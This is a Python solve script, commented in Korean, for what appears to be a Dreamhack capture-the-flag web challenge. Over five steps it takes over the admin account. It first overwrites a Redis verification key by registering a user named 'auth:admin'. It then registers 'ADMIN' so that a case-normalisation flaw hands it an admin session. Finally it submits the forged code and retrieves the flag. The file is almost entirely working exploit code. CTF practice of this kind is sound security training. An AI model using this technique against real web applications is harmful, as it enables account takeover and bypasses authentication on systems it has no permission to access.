import requests
import sys

# 사용법: python3 solve.py http://host1.dreamhack.games:포트번호
if len(sys.argv) != 2:
    print("[!] 사용법: python3 solve.py [타겟_URL]")
    sys.exit(1)

TARGET_URL = sys.argv[1].rstrip("/")

# 세션 1: Redis Key 조작을 위한 'auth:admin' 계정용
sess1 = requests.Session()
# 세션 2: 세션 하이재킹 및 플래그 획득을 위한 'ADMIN' 계정용
sess2 = requests.Session()

print(f"[*] ========================================================")
print(f"[*] 타겟 URL: {TARGET_URL}")
print(f"[*] 디버깅 모드 활성화: 모든 HTTP 응답 상태 및 정보를 상세 출력합니다.")
print(f"[*] ========================================================\n")

# ------------------------------------------------------------------
# [Step 1] auth:admin 계정 생성
# ------------------------------------------------------------------
print("[*] [Step 1] 'auth:admin' 계정 생성을 시도합니다.")
signup_data_1 = {"userid": "auth:admin", "userpw": "1234"}
print(f"    [-] 전송 데이터: {signup_data_1}")
res1 = sess1.post(f"{TARGET_URL}/signup", data=signup_data_1)
print(f"    [-] HTTP 상태 코드: {res1.status_code}")
print(f"    [-] 응답 텍스트 길이: {len(res1.text)} bytes")

if "Signup!" in res1.text:
    print("    [+] 'auth:admin' 회원가입(자동 로그인) 성공!")
else:
    print("    [!] 'auth:admin' 가입 실패. 이미 존재할 수 있으므로 다음으로 진행합니다.")


# ------------------------------------------------------------------
# [Step 2] Redis Key 덮어쓰기 (admin의 인증코드를 1로 조작)
# ------------------------------------------------------------------
print("\n[*] [Step 2] 'auth:admin' 계정으로 /email_verify 를 요청하여 Redis Key 덮어쓰기를 시도합니다.")
print("    [-] 목표: Redis의 'auth:admin@ctfprob.dreamhack.io' 값을 '1' 로 고정")
res2 = sess1.post(f"{TARGET_URL}/email_verify")
print(f"    [-] HTTP 상태 코드: {res2.status_code}")
print(f"    [-] 이메일 발송 성공 여부(응답 확인): {'Send Email To' in res2.text}")
print("    [+] Redis Key 덮어쓰기 완료! (admin의 인증코드는 이제 '1'입니다)")


# ------------------------------------------------------------------
# [Step 3] ADMIN 계정 생성 (대문자 트릭)
# ------------------------------------------------------------------
print("\n[*] [Step 3] 'ADMIN' (대문자) 계정 생성을 시도합니다.")
print("    [-] app.py의 to_json() 결함으로 인해 세션 정보에는 'admin'으로 저장됩니다.")
signup_data_2 = {"userid": "ADMIN", "userpw": "1234"}
print(f"    [-] 전송 데이터: {signup_data_2}")
res3 = sess2.post(f"{TARGET_URL}/signup", data=signup_data_2)
print(f"    [-] HTTP 상태 코드: {res3.status_code}")

if "Signup!" in res3.text:
    print("    [+] 'ADMIN' 회원가입(자동 로그인) 성공! (현재 세션은 'admin'으로 위장됨)")
else:
    print("    [!] 'ADMIN' 가입 실패. 이미 가입되어 있을 수 있습니다.")


# ------------------------------------------------------------------
# [Step 4] 조작된 인증 코드 '1' 제출
# ------------------------------------------------------------------
print("\n[*] [Step 4] 위장된 'admin' 세션으로 /email_verify_chk 에 접근하여 인증코드 '1'을 제출합니다.")
verify_data = {"code": "1"}
print(f"    [-] 전송 데이터: {verify_data}")
res4 = sess2.post(f"{TARGET_URL}/email_verify_chk", data=verify_data)
print(f"    [-] HTTP 상태 코드: {res4.status_code}")
print(f"    [-] 응답 텍스트 일부: {res4.text[:100]}...")

if "AUTH!" in res4.text:
    print("    [+] 인증 성공! DB에 존재하는 실제 'admin' 계정의 auth 컬럼이 True로 업데이트되었습니다.")
else:
    print("    [!] 인증 실패. 코드가 맞지 않거나 서버 상태가 이상할 수 있습니다.")


# ------------------------------------------------------------------
# [Step 5] Flag 획득
# ------------------------------------------------------------------
print("\n[*] [Step 5] /flag 페이지에 접근하여 FLAG를 획득합니다.")
res5 = sess2.get(f"{TARGET_URL}/flag")
print(f"    [-] HTTP 상태 코드: {res5.status_code}")
print(f"    [-] 응답 텍스트 길이: {len(res5.text)} bytes")

import re
flag_match = re.search(r'DH{.*?}', res5.text)
if flag_match:
    print(f"\n[🎉] FLAG 획득 성공: {flag_match.group(0)}")
else:
    print("\n[!] FLAG를 찾을 수 없습니다. 원본 응답을 확인하세요.")
    print("-" * 50)
    print(res5.text)
    print("-" * 50)